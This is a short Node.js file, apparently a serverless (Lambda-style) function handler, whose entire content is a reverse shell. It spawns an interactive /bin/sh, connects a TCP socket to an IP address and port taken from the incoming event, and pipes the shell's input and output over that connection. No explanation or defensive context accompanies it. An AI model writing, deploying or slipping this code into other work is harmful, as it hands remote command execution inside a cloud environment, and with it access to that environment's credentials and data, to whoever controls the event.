const net = require('net');
const cp = require('child_process')

exports.handler = (event) => {   
    const process = cp.spawn('/bin/sh', ['-i']);
    
    const socket = new net.Socket();
    socket.connect(event.port, event.ip, function () { 
        socket.pipe(process.stdin);
        process.stdout.pipe(socket);
        process.stderr.pipe(socket);
    });
};
